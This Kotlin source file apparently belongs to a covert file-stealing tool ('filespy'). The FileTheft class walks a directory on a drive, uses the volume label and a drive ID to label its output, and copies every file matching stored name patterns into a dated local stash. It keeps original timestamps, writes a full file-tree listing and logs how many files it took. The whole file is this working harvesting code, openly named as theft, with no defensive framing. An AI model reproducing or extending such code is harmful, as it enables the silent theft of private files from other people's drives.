package studio.papercube.sh.filespy

import studio.papercube.library.fileassist.DriveMarker
import studio.papercube.library.fileassist.getVolumeLabel
import studio.papercube.library.fileassist.validateFileName
import java.io.File
import java.time.LocalDate
import java.time.LocalTime
import java.util.concurrent.CompletableFuture
import java.util.stream.Collectors

class FileTheft(val directory: File) : Theft {
    companion object {
        private const val STEAL_RESULT_FAILURE = 1
        private const val STEAL_RESULT_SUCCESS = 0
        private const val LOG_TAG = "FileTheft"
        @JvmStatic
        private fun timeStamp() = System.currentTimeMillis()

        @JvmStatic
        fun stealSingleFile(f: File,
                            destDir: File = File("${ConfigParameters.instance.dataPath}/${LocalDate.now()}/")): Boolean {
            try {
                val targetFile = File("${destDir.absolutePath}/${f.nameWithoutExtension}-${timeStamp()}.${f.extension}")
                f.copyTo(targetFile, bufferSize = 16384)
                targetFile.setLastModified(f.lastModified())
            } catch (e: Exception) {
                e.printStackTrace()
                return false
            }
            return true
        }

    }


    override fun steal() {
        log.i(LOG_TAG, "Stealing $directory on thread ${Thread.currentThread().name}")
        val patterns = PatternsManager.default.readPatterns()
        val driveMarker = DriveMarker.resolve(directory)
        val destDir = File(
                "${ConfigParameters.instance.dataPath}/" +
                        "${LocalDate.now()}" +
                        "/${LocalTime.now().toString().replace(':', '-').validateFileName()}" +
                        "-${directory.absolutePath.first()}" +
                        "-${directory.getVolumeLabel().validateFileName()}" +
                        "-id${driveMarker.markID()}"
        )
        log.i(LOG_TAG, "Destination dir: $destDir")
        val fileWalker = FileWalker(directory)

        if (!fileWalker.getExceptions().isEmpty()) {
            val exceptions = fileWalker.getExceptions()
            log.w(LOG_TAG, "${exceptions.size} exceptions encountered walking ${directory.absolutePath}")
            val headExceptions = exceptions
                    .take(30)
                    .joinToString(separator = "\n", prefix = "\n") { it.toString() }
            log.w(LOG_TAG, "The first 30 exceptions are : $headExceptions")
        }

        val stealResults: Map<Int, Long> = fileWalker.walk()
                .stream()
                .filter { fileToCheck -> patterns.any { pattern -> pattern.matchesWithName(fileToCheck.name) } }
                .map { if (stealSingleFile(it, destDir)) STEAL_RESULT_SUCCESS else STEAL_RESULT_FAILURE }
                .collect(Collectors.groupingBy({ value: Int -> value }, Collectors.counting()))
        val fileTreeOutput = File(destDir, "FileTree.txt").bufferedWriter()
        fileTreeOutput.write(fileWalker.fileTreeString)
        fileTreeOutput.close()
        log.i(LOG_TAG, "Done stealing $directory. " +
                "${stealResults[STEAL_RESULT_SUCCESS]} file(s) succeeded, " +
                "${stealResults[STEAL_RESULT_FAILURE]} failed")
    }

    fun stealAsync(): CompletableFuture<Unit> {
        return CompletableFuture.supplyAsync { steal() }
    }


}